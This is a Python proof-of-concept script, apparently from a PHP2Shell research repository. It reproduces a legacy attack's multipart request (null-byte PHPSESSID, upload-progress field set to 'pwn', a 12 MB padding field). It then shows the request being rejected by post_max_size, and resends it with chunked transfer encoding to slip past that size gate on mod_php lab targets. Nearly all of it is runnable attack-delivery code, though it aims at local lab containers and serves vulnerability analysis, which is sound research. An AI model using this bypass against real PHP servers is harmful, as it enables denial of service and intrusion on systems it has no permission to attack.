#!/usr/bin/env python3
"""Reproduce the Wiz Variant-1 (legacy) PHP2Shell request shape and its
post_max_size failure, then the chunked bypass around it.

Wiz (2026-10-27) observed the legacy 9bie chain fail before reaching the
memory-exhaustion code:

    POST / HTTP/1.1
    Content-Type: multipart/form-data; boundary=SSSSSSSSSSSSSSSSS
    Content-Length: 12655437
    [1,005 parts]
     1001 x p0000                    = "x"
        1 x PHPSESSID                = "\\x00"
        1 x PHP_SESSION_UPLOAD_PROGRESS = "pwn"
        1 x f (file)                 = "A" x 64
        1 x big                      = "B" x ~12 MB

    POST Content-Length of 12655437 bytes exceeds the limit of 8388608 bytes

This POC reproduces that exact body and the gate rejection, then sends the
identical bytes with `Transfer-Encoding: chunked` (no Content-Length) to
show the mod_php delivery bypass documented in ANALYSIS §0.4.

Usage:
  python3 poc/verify_legacy_chain.py --target http://127.0.0.1:18111 \
      --container php2shell-pure-modphp-8m
  python3 poc/verify_legacy_chain.py --target http://127.0.0.1:18110 --variant roundcube
"""

import argparse
import os
import re
import subprocess
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from php2shell import amplify, legacy, probe

BOUNDARY = legacy.BOUNDARY
GATE_RE = legacy.GATE_RE


def legacy_body(big_mb=12.0):
    return legacy.legacy_body(big_mb=big_mb)


def roundcube_body(fields=1001, field_len=3000):
    return legacy.roundcube_body(fields=fields, field_len=field_len)


def log_since(container, since="3m"):
    try:
        r = subprocess.run(
            ["docker", "logs", "--since", since, container],
            capture_output=True, text=True, timeout=20,
        )
        return (r.stdout or "") + (r.stderr or "")
    except Exception:
        return ""


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="http://127.0.0.1:18111")
    ap.add_argument("--path", default="/index.php")
    ap.add_argument("--variant", choices=["legacy", "roundcube"], default="legacy")
    ap.add_argument("--big-mb", type=float, default=12.0)
    ap.add_argument("--container", default=None,
                    help="lab container to read the gate/OOM log from")
    ap.add_argument("--chunked", action="store_true", default=True,
                    help="also send the same body chunked (default on)")
    ap.add_argument("--no-chunked", dest="chunked", action="store_false")
    args = ap.parse_args()

    scheme, host, port = probe.parse_target(args.target)
    if scheme != "http":
        sys.exit("lab targets are plain HTTP")

    body = legacy_body(args.big_mb) if args.variant == "legacy" else roundcube_body()
    print("[*] Wiz Variant-1 request shape reproduction")
    print(f"    target: {host}:{port}  variant: {args.variant}")
    print(f"    body: {len(body)} bytes ({len(body)/1024/1024:.2f} MB)")
    print()

    print("[1] Control — declared Content-Length (the shape Wiz observed):")
    ctrl = amplify.send_declared(host, port, args.path, body,
                                 "multipart/form-data", boundary=BOUNDARY)
    ctrl_txt = probe.body(ctrl).decode("latin-1", "replace")
    m = GATE_RE.search(probe.body(ctrl)) or GATE_RE.search(
        log_since(args.container).encode("latin-1") if args.container else b"")
    print(f"    {probe.status(ctrl)}  body={len(probe.body(ctrl))} B")
    if m:
        print(f"    [GATE] declared {m.group(1).decode()} bytes > "
              f"post_max_size {m.group(2).decode()} bytes")
    elif "exceeds the limit" in ctrl_txt:
        print("    [GATE] post_max_size rejection in body")
    else:
        print("    [*] no gate rejection observed (post_max_size may be high)")
    print()

    if args.chunked:
        print("[2] Same bytes, Transfer-Encoding: chunked, no Content-Length:")
        test = amplify.send_chunked(host, port, args.path, body,
                                    "multipart/form-data", boundary=BOUNDARY)
        test_txt = probe.body(test).decode("latin-1", "replace")
        print(f"    {probe.status(test)}  body={len(probe.body(test))} B")
        gate = "exceeds the limit" in test_txt
        parsed = ("POST count:" in test_txt) or ("FILES count:" in test_txt)
        # A started upload-progress session also proves the body reached the
        # parser (the declared-length control never sets this cookie).
        if b"Set-Cookie: PHPSESSID=" in test and "POST count: 0" not in test_txt:
            parsed = True
        if not gate and (parsed or "500" in probe.status(test)):
            print()
            print("[EVIDENCE] LEGACY SHAPE REPRODUCED + CHUNKED BYPASS")
            print("    - the declared 12 MB legacy body is rejected by")
            print("      post_max_size exactly as Wiz observed;")
            print("    - the identical bytes chunked were NOT rejectable by")
            print("      the declared-length gate (mod_php de-chunks into a")
            print("      lengthless stream), so the legacy chain's first")
            print("      failure is a delivery choice, not a hard limit.")
            print("    - Wiz saw the same kit fail later in the chain (worker")
            print("      pinning / leak); this POC only reproduces step 0.")
            return 0
        if gate:
            print("    [*] still gate-rejected (frontend enforced length)")
        else:
            print("    [*] inconclusive: inspect the target/container log")
        return 1

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
